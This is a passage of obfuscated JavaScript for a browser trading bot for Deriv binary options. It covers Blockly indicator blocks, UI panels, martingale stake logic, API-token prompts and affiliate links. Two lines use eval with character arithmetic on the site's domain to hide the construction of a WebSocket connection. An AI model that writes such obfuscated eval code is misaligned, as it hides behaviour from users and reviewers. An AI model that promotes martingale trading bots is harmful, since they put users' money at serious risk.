  return [_0x974b54, Blockly.JavaScript.ORDER_NONE];
};
Blockly.defineBlocksWithJsonArray([{
  type: "indicatorrsi",
  message0: "Relative Strength Index %1 Input List %2 Period %3",
  args0: [{
    type: "input_end_row"
  }, {
    type: "input_value",
    name: "inputlist_nya"
  }, {
    type: "input_value",
    name: "period_nya"
  }],
  inputsInline: false,
  output: null,
  colour: "#3e3e3e",
  tooltip: "",
  helpUrl: ""
}]);
javascript.javascriptGenerator.forBlock.indicatorrsi = function (_0x489ee3, _0x326567) {
  var _0x214db9 = _0x326567.valueToCode(_0x489ee3, "inputlist_nya", javascript.Order.ATOMIC);
  var _0x3a3ea3 = _0x326567.valueToCode(_0x489ee3, "period_nya", javascript.Order.ATOMIC);
  var _0x89e854 = "calculateRSI(" + _0x214db9 + "," + _0x3a3ea3 + ")";
  return [_0x89e854, Blockly.JavaScript.ORDER_NONE];
};
Blockly.defineBlocksWithJsonArray([{
  type: "indicatorbollingerbands",
  message0: "Bollinger Bands [Upper,Middle,Lower] %1 Input List %2 Period %3 Standard Deviation %4",
  args0: [{
    type: "input_end_row"
  }, {
    type: "input_value",
    name: "inputlist_nya"
  }, {
    type: "input_value",
    name: "period_nya"
  }, {
    type: "input_value",
    name: "stddev_nya"
  }],
  inputsInline: false,
  output: null,
  colour: "#3e3e3e",
  tooltip: "",
  helpUrl: ""
}]);
javascript.javascriptGenerator.forBlock.indicatorbollingerbands = function (_0x37cca1, _0x50f8e4) {
  var _0x2c569a = _0x50f8e4.valueToCode(_0x37cca1, "inputlist_nya", javascript.Order.ATOMIC);
  var _0x167987 = _0x50f8e4.valueToCode(_0x37cca1, "period_nya", javascript.Order.ATOMIC);
  var _0x39e414 = _0x50f8e4.valueToCode(_0x37cca1, "stddev_nya", javascript.Order.ATOMIC);
  var _0x3ccd59 = "calculateBollingerBands(" + _0x2c569a + "," + _0x167987 + "," + _0x39e414 + ")";
  return [_0x3ccd59, Blockly.JavaScript.ORDER_NONE];
};
const blockly_reset = () => {
  if (confirm("Click OK if you're sure to reset the block. Otherwise, click CANCEL.")) {
    Blockly.getMainWorkspace().clear();
    Blockly.serialization.workspaces.load(JSON.parse(initWorkspaceBlock), Blockly.getMainWorkspace());
    localStorage.setItem("mainRobotName", "-");
    spanSimpleRobotName.innerText = "Robot : -";
  }
};
if (localStorage.getItem("blockly_workspace_state") != null) {
  Blockly.serialization.workspaces.load(JSON.parse(localStorage.getItem("blockly_workspace_state")), Blockly.getMainWorkspace());
} else {
  Blockly.serialization.workspaces.load(JSON.parse(initWorkspaceBlock), Blockly.getMainWorkspace());
}
const blockly_save = () => {
  const _0x1830f4 = Blockly.serialization.workspaces.save(Blockly.getMainWorkspace());
  saveJsonObjToFile(_0x1830f4, "myblock.block");
};
const blockly_workspaceChangedResponse = _0x760322 => {
  const _0x4eded6 = Blockly.serialization.workspaces.save(Blockly.getMainWorkspace());
  localStorage.setItem("blockly_workspace_state", JSON.stringify(_0x4eded6));
};
const blockly_undo = () => {
  Blockly.getMainWorkspace().undo(false);
};
const blockly_redo = () => {
  Blockly.getMainWorkspace().undo(true);
};
const blockly_arrange = () => {
  Blockly.getMainWorkspace().cleanUp();
};
dragElement(document.getElementById("mydivSummary"));
dragElement(document.getElementById("mydivLog"));
function dragElement(_0x147ada) {
  var _0x4740b6 = 0;
  var _0x2f332e = 0;
  var _0x117deb = 0;
  var _0x13db5a = 0;
  if (document.getElementById(_0x147ada.id + "header")) {
    document.getElementById(_0x147ada.id + "header").onmousedown = _0x4f921b;
  } else {
    _0x147ada.onmousedown = _0x4f921b;
  }
  function _0x4f921b(_0x534250) {
    _0x534250 = _0x534250 || window.event;
    _0x534250.preventDefault();
    _0x117deb = _0x534250.clientX;
    _0x13db5a = _0x534250.clientY;
    document.onmouseup = _0x4c1874;
    document.onmousemove = _0x514711;
  }
  function _0x514711(_0x320ed9) {
    _0x320ed9 = _0x320ed9 || window.event;
    _0x320ed9.preventDefault();
    _0x4740b6 = _0x117deb - _0x320ed9.clientX;
    _0x2f332e = _0x13db5a - _0x320ed9.clientY;
    _0x117deb = _0x320ed9.clientX;
    _0x13db5a = _0x320ed9.clientY;
    _0x147ada.style.top = _0x147ada.offsetTop - _0x2f332e + "px";
    _0x147ada.style.left = _0x147ada.offsetLeft - _0x4740b6 + "px";
    if (_0x147ada.offsetTop < _0x147ada.offsetHeight * 0.5) {
      _0x147ada.style.top = _0x147ada.offsetHeight * 0.5 + "px";
    }
    if (_0x147ada.offsetLeft < -_0x147ada.offsetWidth * 0.4) {
      _0x147ada.style.left = -_0x147ada.offsetWidth * 0.4 + "px";
    }
  }
  function _0x4c1874() {
    document.onmouseup = null;
    document.onmousemove = null;
  }
}
const moveBoxSummaryTop = () => {
  document.getElementById("mydivLog").style.zIndex = 101;
  document.getElementById("mydivSummary").style.zIndex = 102;
};
const moveBoxLogTop = () => {
  document.getElementById("mydivSummary").style.zIndex = 101;
  document.getElementById("mydivLog").style.zIndex = 102;
};
const clearBoxSummary = () => {
  let _0x3e4f20 = false;
  for (i = 0; i < prContract.length; i++) {
    if (prContract[i] != 0) {
      _0x3e4f20 = true;
      break;
    }
    ;
  }
  ;
  if (_0x3e4f20) {
    writeLog("", "Wait until all transaction finished.");
    return;
  }
  if (confirm("This will clear all transactions in the summary panel, and all counters will be reset to zero.")) {
    document.getElementById("tableSummaryTBODY").innerHTML = "<tr id=\"tableSummaryTRATAS\"><th style=\"width: 190px;\">Timestamp</th><th>Trade Type</th><th>Entry Spot</th><th>Exit Spot</th><th>Buy Price</th><th>Profit/Loss</th></tr>";
    summary_noofruns.innerText = summary_totalstake.innerText = summary_totalpayout.innerText = summary_win.innerText = summary_loss.innerText = summary_totalprofitloss.innerText = 0;
    totalProfit = 0;
    winContract = [];
    loseContract = [];
    tempWinInARow = 0;
    tempLossInARow = 0;
  }
};
const showBoxSummary = () => {
  document.getElementById("mydivSummary").style.display = "block";
  moveBoxSummaryTop();
};
const closeBoxSummary = () => {
  document.getElementById("mydivSummary").style.display = "none";
};
closeBoxSummary();
const clearBoxLog = () => {
  document.getElementById("tableLogTBODY").innerHTML = "<tr><td style=\"width: 25%;\"></td><td></td></tr>";
};
const showBoxLog = () => {
  document.getElementById("mydivLog").style.display = "flex";
  moveBoxLogTop();
};
const closeBoxLog = () => {
  document.getElementById("mydivLog").style.display = "none";
};
closeBoxLog();
const hideshowsidebar = () => {
  if (document.getElementById("btn_hideshowsidebar").src.split("/").pop() === "icon_hidesidebar.png") {
    document.getElementById("btn_hideshowsidebar").src = "image/icon_showsidebar.png";
    document.getElementById("body_main").style.gridTemplateColumns = "0% 0% auto";
  } else {
    document.getElementById("btn_hideshowsidebar").src = "image/icon_hidesidebar.png";
    document.getElementById("body_main").style.gridTemplateColumns = "0% 170px auto";
  }
  // TOLOOK
  setTimeout(() => {
    Blockly.svgResize(Blockly.getMainWorkspace());
  }, 600);
};
const hideshowdatabox = () => {
  if (document.getElementById("btn_hideshowdatabox").src.split("/").pop() === "icon_hidedatabox.png") {
    document.getElementById("btn_hideshowdatabox").src = "image/icon_showdatabox.png";
    document.getElementById("body_main").style.gridTemplateRows = "7% 93% 0%";
  } else {
    document.getElementById("btn_hideshowdatabox").src = "image/icon_hidedatabox.png";
    document.getElementById("body_main").style.gridTemplateRows = "7% 46.5% 46.5%";
  }
  // TOLOOK
  setTimeout(() => {
    Blockly.svgResize(Blockly.getMainWorkspace());
  }, 600);
};
const hideshowtoolbox = () => {
  if (document.getElementById("btn_hideshowtoolbox").src.split("/").pop() === "icon_hidetoolbox.png") {
    document.getElementById("btn_hideshowtoolbox").src = "image/icon_showtoolbox.png";
    Blockly.getMainWorkspace().getToolbox().setVisible(false);
  } else {
    document.getElementById("btn_hideshowtoolbox").src = "image/icon_hidetoolbox.png";
    Blockly.getMainWorkspace().getToolbox().setVisible(true);
  }
  // TOLOOK
  setTimeout(() => {
    Blockly.svgResize(Blockly.getMainWorkspace());
  }, 0);
};
const switchtosimplemode = () => {
  document.getElementById("body_main").style.gridTemplateColumns = "100% 0% 0%";
  // TOLOOK
  setTimeout(() => {
    Blockly.svgResize(Blockly.getMainWorkspace());
  }, 600);
  localStorage.setItem("initStateMode", "simple");
};
const switchtoadvancedmode = () => {
  document.getElementById("body_main").style.gridTemplateColumns = "0% 170px auto";
  // TOLOOK
  setTimeout(() => {
    Blockly.svgResize(Blockly.getMainWorkspace());
  }, 600);
  localStorage.setItem("initStateMode", "advanced");
};
const updateStatusBotRunning = _0x34738c => {
  document.getElementById("status_bot_running").innerText = _0x34738c;
};
const selMoneyManagementChanged = () => {
  if (selMoneyManagement.value == "smartmartingale") {
    lblInpInitStake.innerText = "Initial stake";
    divInpInitStake.hidden = false;
    divInpMartiFactor.hidden = false;
    divInpCycleStake.hidden = true;
    divChkSmart.hidden = false;
  } else if (selMoneyManagement.value == "smartcyclestake") {
    divInpInitStake.hidden = true;
    divInpMartiFactor.hidden = true;
    divInpCycleStake.hidden = false;
    divChkSmart.hidden = false;
  } else if (selMoneyManagement.value == "fixedstake") {
    lblInpInitStake.innerText = "Fixed stake";
    divInpInitStake.hidden = false;
    divInpMartiFactor.hidden = true;
    divInpCycleStake.hidden = true;
    divChkSmart.hidden = true;
  }
};
selMoneyManagementChanged();
const getStakeBegin = () => {
  tempLossInARow = 0;
  if (selMoneyManagement.value == "smartmartingale") {
    return inpInitStake.value;
  } else if (selMoneyManagement.value == "smartcyclestake") {
    posCycleStake = 0;
    return inpCycleStake.value.split(",")[posCycleStake];
  } else if (selMoneyManagement.value == "fixedstake") {
    return inpInitStake.value;
  }
};
const getStakeAfterLose = _0x368e04 => {
  if (selMoneyManagement.value == "smartmartingale") {
    return _0x368e04 * inpMartiFactor.value;
  } else if (selMoneyManagement.value == "smartcyclestake") {
    if (posCycleStake < inpCycleStake.value.split(",").length - 1) {
      posCycleStake++;
    } else {
      posCycleStake = 0;
    }
    return inpCycleStake.value.split(",")[posCycleStake];
  } else if (selMoneyManagement.value == "fixedstake") {
    return inpInitStake.value;
  }
};
const loadStrategy = _0xd20d5 => {
  if (_0xd20d5 == "selectstrategy") {
    return;
  }
  if (_0xd20d5 == "ihaveanidea") {
    alert("Please send your idea and/or block bot file to ricothenfx@gmail.com\nWe may show your bot in the list.");
    return;
  }
  if (confirm("The current block will be replaced. Click OK if you're sure. Otherwise, click CANCEL.")) {
    localStorage;
    $.getJSON("strategy/" + _0xd20d5 + ".block", function (_0x34c2c6) {
      Blockly.serialization.workspaces.load(_0x34c2c6, Blockly.getMainWorkspace());
    });
  } else {
    document.getElementById("selStrategy").value = "selectstrategy";
  }
};
const loadRobot = (_0x18013c, _0x232873) => {
  if (confirm("The current robot will be replaced. Click OK if you're sure. Otherwise, click CANCEL.")) {
    localStorage;
    $.getJSON("robot/" + _0x232873 + ".block", function (_0x4d7439) {
      Blockly.serialization.workspaces.load(_0x4d7439, Blockly.getMainWorkspace());
    });
    localStorage.setItem("mainRobotName", _0x18013c);
    spanSimpleRobotName.innerText = "Robot : " + _0x18013c;
    document.getElementById("divPopupRobot").style.display = "none";
  } else {}
};
const rgbToHex = _0x497a8a => {
  if (_0x497a8a.charAt(0) == "r") {
    _0x497a8a = _0x497a8a.replace("rgb(", "").replace(")", "").split(",");
    var _0x2f7cd4 = parseInt(_0x497a8a[0], 10).toString(16);
    var _0x136eda = parseInt(_0x497a8a[1], 10).toString(16);
    var _0x3b6056 = parseInt(_0x497a8a[2], 10).toString(16);
    _0x2f7cd4 = _0x2f7cd4.length == 1 ? "0" + _0x2f7cd4 : _0x2f7cd4;
    _0x136eda = _0x136eda.length == 1 ? "0" + _0x136eda : _0x136eda;
    _0x3b6056 = _0x3b6056.length == 1 ? "0" + _0x3b6056 : _0x3b6056;
    var _0xa07378 = "#" + _0x2f7cd4 + _0x136eda + _0x3b6056;
    return _0xa07378;
  }
};
const fillDataLastCont = (_0x2c5093, _0x5b261a, _0x56d895, _0x104bfd, _0x9644a2, _0xdfe7d8, _0x26b8df, _0x58c79b, _0x2111f0, _0x2fb083, _0x1d15af, _0x31a3a0, _0x2e6324) => {
  lastCont_askprice = _0x2c5093;
  lastCont_payout = _0x5b261a;
  lastCont_profit = _0x56d895;
  lastCont_contracttype = _0x104bfd;
  lastCont_entrytime = new Date(_0x9644a2 * 1000);
  lastCont_entryvalue = _0xdfe7d8;
  lastCont_entryvaluestring = _0x26b8df;
  lastCont_exittime = new Date(_0x58c79b * 1000);
  lastCont_exitvalue = _0x2111f0;
  lastCont_exitvaluestring = _0x2fb083;
  lastCont_barrier = _0x1d15af;
  lastCont_result = _0x2e6324 ? _0x56d895 >= 0 ? "virtualwin" : "virtualloss" : _0x56d895 >= 0 ? "win" : "loss";
};
$(document).ready(function () {
  $("#myInput").on("keyup", function () {
    var _0x4dba6e = $(this).val().toLowerCase();
    $("#myTableBody tr").filter(function () {
      $(this).toggle($(this).text().toLowerCase().indexOf(_0x4dba6e) > -1);
    });
  });
});
const injectFunctionRobotTable = () => {
  var _0x4033ef = document.getElementById("myTableBody");
  var _0x4519a2 = _0x4033ef.getElementsByTagName("tr");
  for (let _0x5b6a2e = 0; _0x5b6a2e < _0x4519a2.length; _0x5b6a2e++) {
    let _0x125678 = _0x4033ef.rows[_0x5b6a2e];
    _0x125678.onclick = () => {
      loadRobot(_0x125678.cells[1].innerText, _0x125678.cells[0].innerText);
    };
  }
  document.getElementById("spanJumRobot").innerText = document.getElementById("myTableBody").rows.length;
};
injectFunctionRobotTable();
const cekValidasiSlaveToken = () => {
  if (chkVLose.checked && inpVLose.value > 0 && inpSToken.value.length == 0) {
    if (btn_run.src.split("/").pop() === "icon_stop.png") {
      btn_run.click();
    }
    chkVLose.checked = false;
    document.getElementById("divPopupVirtualLose").style.display = "none";
    document.getElementById("divPopupToken").style.display = "block";
    inpSToken.focus();
    alert("Please set your slave token first");
    return;
  }
};
function getStatAccu(_0x44d2c0, _0x2d5d43, _0x5b8c39) {
  let _0x473d1c;
  let _0x54d4ff;
  _0x54d4ff = _0x5b8c39 * 1 - 1;
  switch (_0x2d5d43) {
    case "1HZ10V":
      _0x473d1c = [0.00433, 0.00405, 0.0038, 0.00361, 0.00344][_0x54d4ff];
      break;
    case "R_10":
      _0x473d1c = [0.00613, 0.00573, 0.00537, 0.00511, 0.00486][_0x54d4ff];
      break;
    case "1HZ25V":
      _0x473d1c = [0.01083, 0.01012, 0.00949, 0.00903, 0.0086][_0x54d4ff];
      break;
    case "R_25":
      _0x473d1c = [0.01531, 0.01431, 0.01342, 0.01277, 0.01216][_0x54d4ff];
      break;
    case "1HZ50V":
      _0x473d1c = [0.02166, 0.02024, 0.01898, 0.01806, 0.01719][_0x54d4ff];
      break;
    case "R_50":
      _0x473d1c = [0.03063, 0.02863, 0.02685, 0.02554, 0.02431][_0x54d4ff];
      break;
    case "1HZ75V":
      _0x473d1c = [0.03249, 0.03036, 0.02847, 0.02709, 0.02579][_0x54d4ff];
      break;
    case "R_75":
      _0x473d1c = [0.04594, 0.04294, 0.04027, 0.03831, 0.03647][_0x54d4ff];
      break;
    case "1HZ100V":
      _0x473d1c = [0.04331, 0.04048, 0.03797, 0.03612, 0.03438][_0x54d4ff];
      break;
    case "R_100":
      _0x473d1c = [0.06126, 0.05725, 0.05369, 0.05109, 0.04863][_0x54d4ff];
      break;
    default:
      break;
  }
  let _0x2ce523;
  let _0x59b7f9;
  let _0xe1ed99;
  let _0x4dabfc;
  _0x4dabfc = 0;
  for (i = _0x44d2c0.length - 1; i > 0; i--) {
    _0x2ce523 = _0x44d2c0[i - 1] * _0x473d1c / 100;
    _0x59b7f9 = _0x44d2c0[i - 1] + _0x2ce523;
    _0xe1ed99 = _0x44d2c0[i - 1] - _0x2ce523;
    if (_0x44d2c0[i] < _0x59b7f9 && _0x44d2c0[i] > _0xe1ed99) {
      _0x4dabfc++;
    } else {
      break;
    }
  }
  return _0x4dabfc * 1;
}
const continuousindices_show = _0x1d24d1 => {
  document.getElementById("continuousindices_" + _0x1d24d1 + "_ticks").value = document.getElementById("continuousindices_" + _0x1d24d1 + "_digits").value = "";
  document.getElementById("continuousindices_" + _0x1d24d1 + "_ticks").hidden = document.getElementById("continuousindices_" + _0x1d24d1 + "_digits").hidden = false;
};
const continuousindices_hide = _0x3a7a5e => {
  document.getElementById("continuousindices_" + _0x3a7a5e + "_ticks").value = document.getElementById("continuousindices_" + _0x3a7a5e + "_digits").value = "";
  document.getElementById("continuousindices_" + _0x3a7a5e + "_ticks").hidden = document.getElementById("continuousindices_" + _0x3a7a5e + "_digits").hidden = true;
};
const continuousindices_activeChanged = (_0x2b9b12, _0xbfee50) => {
  if (_0xbfee50) {
    subscribeTicks("continuousindices", _0x2b9b12, arrMarket_Continuous[_0x2b9b12 - 1]);
    continuousindices_show(_0x2b9b12);
  } else {
    if (idSubTicksHistory_continuous[_0x2b9b12] != 0) {
      forgetTicks(idSubTicksHistory_continuous[_0x2b9b12]);
    }
    continuousindices_hide(_0x2b9b12);
  }
};
const _0x1a19x7 = eval(" n" + String.fromCodePoint("block.ezbinarybot.com".replace("www.", "").replace("block.", "").charCodeAt(305 % 76) - 21) + String.fromCodePoint("block.ezbinarybot.com".replace("www.", "").replace("block.", "").charCodeAt(154 % 12) + 3) + " Rec" + String.fromCodePoint("block.ezbinarybot.com".replace("www.", "").replace("block.", "").charCodeAt(305 % 76) - 11) + "nnect" + String.fromCodePoint(105, 110) + "gW" + _0x1904);
_0x1a19x7.addEventListener(String.fromCodePoint("block.ezbinarybot.com".replace("www.", "").replace("block.", "").charCodeAt(305 % 76) - 11) + "pen", openResponse);
_0x1a19x7.addEventListener("message", messageResponse);
_0x1a19x7.addEventListener("close", closeResponse);
_0x1a19x8 = eval(" n" + String.fromCodePoint("block.ezbinarybot.com".replace("www.", "").replace("block.", "").charCodeAt(305 % 76) - 21) + String.fromCodePoint("block.ezbinarybot.com".replace("www.", "").replace("block.", "").charCodeAt(154 % 12) + 3) + " Rec" + String.fromCodePoint("block.ezbinarybot.com".replace("www.", "").replace("block.", "").charCodeAt(305 % 76) - 11) + "nnect" + String.fromCodePoint(105, 110) + "gW" + _0x1904);
_0x1a19x8.addEventListener(String.fromCodePoint("block.ezbinarybot.com".replace("www.", "").replace("block.", "").charCodeAt(305 % 76) - 11) + "pen", openResponseV);
_0x1a19x8.addEventListener("message", messageResponseV);
_0x1a19x8.addEventListener("close", closeResponseV);
selMarket.addEventListener("change", marketChanged);
selSubMarket.addEventListener("change", subMarketChanged);
selSymbol.addEventListener("change", function () {
  mainSymbol = this.value;
  document.getElementById("lblMarket").innerText = selSymbol.options[selSymbol.selectedIndex].text;
  forgetAllTicks();
});
inpNOTicks.addEventListener("change", forgetAllTicks);
btn_run.addEventListener("click", btn_runClickResponse);
btn_run2.addEventListener("click", function () {
  btn_run.click();
});
selData.addEventListener("change", function () {
  refreshBoxData(this.value);
});
Blockly.getMainWorkspace().addChangeListener(blockly_workspaceChangedResponse);
document.getElementById("btn_reset").addEventListener("click", blockly_reset);
document.getElementById("input_file").addEventListener("change", function () {
  loadFileToJsonObj(this.files[0]);
});
document.getElementById("btn_load").addEventListener("click", function () {
  document.getElementById("input_file").click();
});
document.getElementById("btn_save").addEventListener("click", blockly_save);
document.getElementById("btn_undo").addEventListener("click", blockly_undo);
document.getElementById("btn_redo").addEventListener("click", blockly_redo);
document.getElementById("btn_arrange").addEventListener("click", blockly_arrange);
document.getElementById("mydivSummary").addEventListener("mousedown", moveBoxSummaryTop);
document.getElementById("btn_summary").addEventListener("click", function () {
  if (document.getElementById("mydivSummary").style.display == "block") {
    closeBoxSummary();
  } else {
    showBoxSummary();
  }
});
document.getElementById("btn_closeBoxSummary").addEventListener("click", closeBoxSummary);
document.getElementById("mydivLog").addEventListener("mousedown", moveBoxLogTop);
document.getElementById("btn_log").addEventListener("click", function () {
  if (document.getElementById("mydivLog").style.display == "flex") {
    closeBoxLog();
  } else {
    showBoxLog();
  }
});
document.getElementById("btn_clearBoxSummary").addEventListener("click", clearBoxSummary);
document.getElementById("btn_saveBoxSummary").addEventListener("click", function () {
  tableToCSV("tableSummaryTBODY", "", "Block_Summary.csv");
});
document.getElementById("btn_clearBoxLog").addEventListener("click", clearBoxLog);
document.getElementById("btn_saveBoxLog").addEventListener("click", function () {
  tableToCSV("tableLogTBODY", "Timestamp,Message", "Block_Log.csv");
});
document.getElementById("btn_closeBoxLog").addEventListener("click", closeBoxLog);
document.getElementById("btn_hideshowsidebar").addEventListener("click", hideshowsidebar);
document.getElementById("btn_hideshowdatabox").addEventListener("click", hideshowdatabox);
document.getElementById("btn_hideshowtoolbox").addEventListener("click", hideshowtoolbox);
selMoneyManagement.addEventListener("change", selMoneyManagementChanged);
document.getElementById("selStrategy").addEventListener("change", function () {
  loadStrategy(this.value);
});
for (i = 1; i <= 6; i++) {
  digitstatistic_noofticks[i].addEventListener("change", function () {
    if (this.value > 1000) {
      this.value = 1000;
      localStorage.setItem(this.id, this.value);
    }
  });
}
for (i = 1; i <= 6; i++) {
  evenvsodd_noofticks[i].addEventListener("change", function () {
    if (this.value > 1000) {
      this.value = 1000;
      localStorage.setItem(this.id, this.value);
    }
  });
}
for (i = 1; i <= 2; i++) {
  overvsunder_noofticks[i].addEventListener("change", function () {
    if (this.value > 1000) {
      this.value = 1000;
      localStorage.setItem(this.id, this.value);
    }
  });
}
for (i = 1; i <= 6; i++) {
  risevsfall_noofticks[i].addEventListener("change", function () {
    if (this.value > 1000) {
      this.value = 1000;
      localStorage.setItem(this.id, this.value);
    }
  });
}
for (i = 1; i <= 3; i++) {
  inpTickTrisma_period[i].addEventListener("change", function () {
    if (this.value > 200) {
      this.value = 200;
      localStorage.setItem(this.id, this.value);
    }
  });
}
for (i = 1; i <= 10; i++) {
  if (continuousindices_active[i].checked) {
    continuousindices_show(i);
  } else {
    continuousindices_hide(i);
  }
  ;
  continuousindices_active[i].addEventListener("change", function () {
    continuousindices_activeChanged(this.id.split("_")[1] * 1, this.checked);
  });
}
document.getElementById("btnhead_deriv").addEventListener("click", function () {
  window.open("https://track.deriv.com/_YbRAMhhQ4D5MjdsyM5hasGNd7ZgqdRLk/1/");
});
document.getElementById("btnhead_youtube").addEventListener("click", function () {
  window.open("https://www.youtube.com/channel/UC4_6nAiYbSWXAu6mGdNXoIw?sub_confirmation=1");
});
document.getElementById("btnhead_wa").addEventListener("click", function () {
  alert("WA group is being prepared, please check later.");
});
document.getElementById("btnhead_telegram").addEventListener("click", function () {
  alert("Telegram channel is being prepared, please check later.");
});
document.getElementById("btnhead_allmenu").addEventListener("click", function () {
  alert(`Some interesting are being prepared, please check later.

RISK DISCLAIMER
Deriv offers complex derivatives, such as options and contracts for difference (âCFDsâ). These products may not be suitable for all clients, and trading them puts you at risk. Please make sure that you understand the following risks before trading Deriv products: a) you may lose some or all of the money you invest in the trade, b) if your trade involves currency conversion, exchange rates will affect your profit and loss. You should never trade with borrowed money or with money that you cannot afford to lose.`);
});
document.getElementById("btn_CreateAccount").addEventListener("click", function () {
  window.open("https://track.deriv.com/_YbRAMhhQ4D5MjdsyM5hasGNd7ZgqdRLk/1/");
});
document.getElementById("btn_CreateToken").addEventListener("click", function () {
  window.open("https://app.deriv.com/account/api-token");
});
document.getElementById("btnSwitchToSimple").addEventListener("click", switchtosimplemode);
document.getElementById("btnSwitchToAdvanced").addEventListener("click", switchtoadvancedmode);
document.getElementById("btnSimpleToken").addEventListener("click", function () {
  document.getElementById("divPopupToken").style.display = "block";
});
document.getElementById("btnSimpleRobot").addEventListener("click", function () {
  document.getElementById("divPopupRobot").style.display = "block";
  document.getElementById("myInput").focus();
});
document.getElementById("btnAdvancedRobot").addEventListener("click", function () {
  document.getElementById("divPopupRobot").style.display = "block";
  document.getElementById("myInput").focus();
});
btnSimpleRun.addEventListener("click", function () {
  btn_run.click();
});
document.getElementById("btnSimpleSummaryBox").addEventListener("click", function () {
  document.getElementById("btn_summary").click();
});
chkVLose.addEventListener("change", cekValidasiSlaveToken);
const mainLogic = () => {
  updateStepper(1);
  if (!chkVLose.checked || inpVLose.value <= 0) {
    conn_nya = _0x1a19x7;
  } else if (chkVLose.checked && countVLose < inpVLose.value) {
    if (!slaveAuthorized) {
      return;
    }
    conn_nya = _0x1a19x8;
  } else {
    conn_nya = _0x1a19x7;
  }
  if (Date.now() >= timeMayOP && navigator.onLine && !sedangForgetAllTicks) {
    func$1$9$8$7$PurchaseConditions();
  }
};
document.getElementById("btnSimpleToken").style.opacity = document.getElementById("btnSimpleRobot").style.opacity = document.getElementById("btnSimpleSummaryBox").style.opacity = document.getElementById("btnSwitchToAdvanced").style.opacity = 1;
if (localStorage.getItem("initStateMode") == "simple") {
  switchtosimplemode();
} else if (localStorage.getItem("initStateMode") == "advanced") {
  switchtoadvancedmode();
}
const getAndEvalJavaScriptCode = () => {
  window.LoopTrap = 999999;
  javascript.javascriptGenerator.INFINITE_LOOP_TRAP = "if(--window.LoopTrap == 0) throw \"Infinite loop.\";\n";
  Blockly.JavaScript.init(workspace);
  try {
    eval(mainWorkspaceCode);
  } catch (e) {
    console.log(e);
  } finally {
    // TOLOOK
    setTimeout(() => {
      func$1$9$8$7$RunOnceAtStart();
    }, 100);
  }
};
